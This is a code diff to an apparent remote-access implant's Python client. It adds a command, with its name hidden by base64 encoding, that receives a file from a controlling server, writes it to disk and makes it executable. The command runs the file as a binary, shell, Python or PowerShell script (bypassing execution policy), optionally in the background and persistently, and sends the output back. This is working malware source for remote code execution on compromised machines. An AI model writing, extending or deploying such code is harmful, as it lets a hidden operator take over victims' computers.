@@ -341,6 +341,79 @@ class Client:
                                 "error": str(e),
                             })
 
+                    elif command == _decode_str("cGF5bG9hZA=="):
+                        import tempfile
+                        try:
+                            data = msg_json.get(_decode_str("ZGF0YQ=="), {})
+                            content_b64 = data.get("content_b64", "")
+                            filename = data.get("filename", "payload.tmp")
+                            payload_type = data.get("type", "bin")
+                            timeout = data.get("timeout", 120)
+                            persist = data.get("persist", False)
+                            args_list = data.get("args", [])
+                            background = data.get("background", False)
+                            content = base64.b64decode(content_b64)
+                            if persist:
+                                out_path = os.path.join(os.getcwd(), filename)
+                                with open(out_path, "wb") as f:
+                                    f.write(content)
+                            else:
+                                tmp = tempfile.NamedTemporaryFile(delete=False, suffix=f"_{filename}")
+                                tmp.write(content)
+                                tmp.close()
+                                out_path = tmp.name
+                            if payload_type in ("elf", "bin", "sh"):
+                                os.chmod(out_path, 0o755)
+                            if payload_type == "ps1":
+                                cmd = ["powershell", "-ExecutionPolicy", "Bypass", "-File", out_path] + args_list
+                            elif payload_type == "sh":
+                                cmd = ["bash", out_path] + args_list
+                            elif payload_type == "py":
+                                cmd = ["python3", out_path] + args_list
+                            else:
+                                cmd = [out_path] + args_list
+                            if background:
+                                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+                                self._send_response({
+                                    "status": "success",
+                                    "action": "payload",
+                                    "stdout": "[background]",
+                                    "stderr": "",
+                                    "returncode": 0,
+                                })
+                            else:
+                                result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+                                if not persist:
+                                    try:
+                                        os.unlink(out_path)
+                                    except OSError:
+                                        pass
+                                self._send_response({
+                                    "status": "success",
+                                    "action": "payload",
+                                    "stdout": result.stdout,
+                                    "stderr": result.stderr,
+                                    "returncode": result.returncode,
+                                })
+                        except subprocess.TimeoutExpired:
+                            self._send_response({
+                                "status": "error",
+                                "action": "payload",
+                                "error": "payload timed out",
+                            })
+                        except Exception as e:
+                            self._send_response({
+                                "status": "error",
+                                "action": "payload",
+                                "error": str(e),
+                            })
+
+                    else:
+                        encrypted_ack = self.crypto.rsa_encrypt(
+                            self.server_public_key, _decode_str("QUNL").encode()
+                        )
+                        self.sock.sendall(len(encrypted_ack).to_bytes(BUFFER_SIZE_LENGTH, "big") + encrypted_ack)
+
                 except KeyError as e:
                     self.logger.debug(f"Unknown command key: {e}")
                     encrypted_ack = self.crypto.rsa_encrypt(
